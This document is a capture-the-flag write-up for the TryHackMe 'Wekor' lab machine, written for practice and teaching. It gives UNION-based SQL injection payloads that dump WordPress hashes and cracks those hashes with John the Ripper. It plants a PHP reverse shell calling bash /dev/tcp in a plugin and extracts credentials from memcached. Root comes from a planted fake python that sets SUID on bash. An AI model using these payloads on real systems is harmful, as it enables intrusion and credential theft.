---
tags:
  - THM
  - Linux
  - Medium
  - SQLi
  - Brute-Force
  - CMS
  - RCE
  - Sudo
  - File-Analysis
  - PATH-HJ
---
https://tryhackme.com/room/wekorra/
# Add Hosts
Append to the `/etc/hosts` file:
```text
10.66.162.215 wekor.thm site.wekor.thm
```
# Scanning
```console
$ nmap -p22,80 -sV -sC wekor.thm

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 95:c3:ce:af:07:fa:e2:8e:29:04:e4:cd:14:6a:21:b5 (RSA)
|   256 4d:99:b5:68:af:bb:4e:66:ce:72:70:e6:e3:f8:96:a4 (ECDSA)
|_  256 0d:e5:7d:e8:1a:12:c0:dd:b7:66:5e:98:34:55:59:f6 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 9 disallowed entries 
| /workshop/ /root/ /lol/ /agent/ /feed /crawler /boot 
|_/comingreallysoon /interesting
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
# MySQL
## MySQL Enumeration
The website is just a site containing the text:
```text
Welcome Internet User!
```
The only valid path listed in `/robots.txt` is `/comingreallysoon/` which contains:
```text
Welcome Dear Client! We've setup our latest website on /it-next, Please go check it out! If you have any comments or suggestions, please tweet them to @faketwitteraccount! Thanks a lot !
```
The website at `/it-next/` is a computer service site with many available services like data recovery, computer repair, shop, etc. 

If we go to shopping cart `/it-next/it_cart.php`, we can see an **apply coupon box**. If we try to input an apostrophe, we get a **MySQL error**:
```text
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%'' at line 1
```

## MySQL Exploitation
Getting schemas (databases):
```sql
' UNION SELECT 1,2,GROUP_CONCAT(0x7c,schema_name,0x7c) FROM information_schema.schemata -- -
```
```text
Coupon Code : 1 With ID : 2 And With Expire Date Of : |information_schema|,|coupons|,|mysql|,|performance_schema|,|sys|,|wordpress| Is Valid!
```
Getting tables from a **WordPress database**:
```sql
' UNION SELECT 1,2,GROUP_CONCAT(0x7c,table_name,0x7c) FROM information_schema.tables WHERE table_schema='wordpress' -- -
```
```text
Coupon Code : 1 With ID : 2 And With Expire Date Of : |wp_commentmeta|,|wp_comments|,|wp_links|,|wp_options|,|wp_postmeta|,|wp_posts|,|wp_term_relationships|,|wp_term_taxonomy|,|wp_termmeta|,|wp_terms|,|wp_usermeta|,|wp_users| Is Valid!
```
Getting rows for **users table**:
```sql
' UNION SELECT 1,2,GROUP_CONCAT(0x7c,column_name,0x7c) FROM information_schema.columns WHERE table_schema='wordpress' AND table_name='wp_users' -- -
```
```text
Coupon Code : 1 With ID : 2 And With Expire Date Of : |ID|,|user_login|,|user_pass|,|user_nicename|,|user_email|,|user_url|,|user_registered|,|user_activation_key|,|user_status|,|display_name| Is Valid!
```
Getting **usernames** and **password hashes** for **WordPress**:
```sql
' UNION SELECT 1,2,GROUP_CONCAT(0x7c,user_login,0x3a,user_pass,0x7c) FROM wordpress.wp_users -- -
```
```text
Coupon Code : 1 With ID : 2 And With Expire Date Of : |admin:$P$BoyfR2QzhNjRNmQZpva6TuuD0EE31B.|,|wp_jeffrey:$P$BU8QpWD.kHZv3Vd1r52ibmO913hmj10|,|wp_yura:$P$B6jSC3m7WdMlLi1/NDb3OFhqv536SV/|,|wp_eagle:$P$BpyTRbmvfcKyTrbDzaK1zSPgM7J6QY/| Is Valid!
```
## Cracking Hashes
Create `hashes.txt` file:
```text
admin:$P$BoyfR2QzhNjRNmQZpva6TuuD0EE31B.
wp_jeffrey:$P$BU8QpWD.kHZv3Vd1r52ibmO913hmj10
wp_yura:$P$B6jSC3m7WdMlLi1/NDb3OFhqv536SV/
wp_eagle:$P$BpyTRbmvfcKyTrbDzaK1zSPgM7J6QY/
```
Find **passwords** using John the Ripper:
```console
$ john --wordlist=/usr/share/dict/rockyou.txt --format=phpass hashes.txt

rockyou          (wp_jeffrey)
xxxxxx           (wp_eagle)
soccer13         (wp_yura)
```
# WordPress
## WordPress Enumeration
After doing some fuzzing, found valid **subdomain** `site.wekor.thm`.

Then, found a **WordPress directory** containing a blog at `site.wekor.thm/wordpress/`.

After multiple logins at `site.wekor.thm/wordpress/wp-login.php`, found that **wp_yura user** has **administrator privileges**.
## Getting RCE
Log in as **wp_yura** in WordPress.

Modify existing WordPress plugin `akismet.php` to contain:
```php
<?php shell_exec('bash -c "bash -i >& /dev/tcp/192.168.186.238/4444 0>&1"'); ?>
```
Wait for connections:
```console
$ nc -lvnp 4444
```
Load the plugin:
```console
$ curl -s http://site.wekor.thm/wordpress/wp-content/plugins/akismet/akismet.php
```
# Post-Exploitation
## User Migration
We are currently **www-data**, but there is a user called **Orka**:
```console
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

$ grep 'sh$' /etc/passwd
root:x:0:0:root:/root:/bin/bash
Orka:x:1001:1001::/home/Orka:/bin/bash
```
Found an unusual internal open port 11211:
```console
$ ss -tulnp | awk '{print $5}' | awk -F ':' '{print $2}' | sort -u

11211
22
3010
3306
52684
5353
631
68
```
After doing some research, found that **Memcached server** usually runs on that port. So, we extract all the data on it following [this guide](https://hackviser.com/tactics/pentesting/services/memcached):
```console
$ slabs=$(echo "stats items" | nc localhost 11211 | grep "items:" | cut -d: -f2 | sort -u)

$ for slab in $slabs; do echo "stats cachedump $slab 1000" | nc localhost 11211; done > /tmp/keys.txt

$ awk '/ITEM/ {print$2}' /tmp/keys.txt | while read key; do echo "get $key" | nc localhost 11211; done
VALUE id 0 4
3476
END
VALUE email 0 14
Orka@wekor.thm
END
VALUE salary 0 8
$100,000
END
VALUE password 0 15
OrkAiSC00L24/7$
END
VALUE username 0 4
Orka
END
```
Become **Orka** with the found **password** and get the **user flag**:
```console
$ su Orka
Password:

$ id
uid=1001(Orka) gid=1001(Orka) groups=1001(Orka)

$ cat /home/Orka/user.txt
```
## Privilege Escalation
We can run an uncommon binary `/home/Orka/Desktop/bitcoin` using `sudo`:
```console
$ sudo -l
[sudo] password for Orka: 
Matching Defaults entries for Orka on osboxes:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User Orka may run the following commands on osboxes:
    (root) /home/Orka/Desktop/bitcoin
```
The binary relies on an external Python script at `/home/Orka/Desktop/transfer.py`:
```console
$ strings /home/Orka/Desktop/bitcoin

...
Enter the password : 
password
Access Denied... 
Access Granted...
			User Manual:			
Maximum Amount Of BitCoins Possible To Transfer at a time : 9 
Amounts with more than one number will be stripped off! 
And Lastly, be careful, everything is logged :) 
Amount Of BitCoins : 
 Sorry, This is not a valid amount! 
python /home/Orka/Desktop/transfer.py %c
...
```
Using LinPEAS, found that we have write access to `/usr/sbin/`:
```console
$ ls -ld /usr/sbin
drwxrwxr-x 2 root Orka 12288 Jan 23  2021 /usr/sbin
```
Abuse of a malicious created python binary:
```console
$ echo -e '#!/bin/bash\nchmod u+s /bin/bash' > /usr/sbin/python

$ chmod +x /usr/sbin/python

$ sudo /home/Orka/Desktop/bitcoin
Enter the password : password
Access Granted...
			User Manual:			
Maximum Amount Of BitCoins Possible To Transfer at a time : 9 
Amounts with more than one number will be stripped off! 
And Lastly, be careful, everything is logged :) 
Amount Of BitCoins : 1
```
Become **root** and get the **flag**:
```console
$ /bin/bash -p

# cat /root/root.txt
```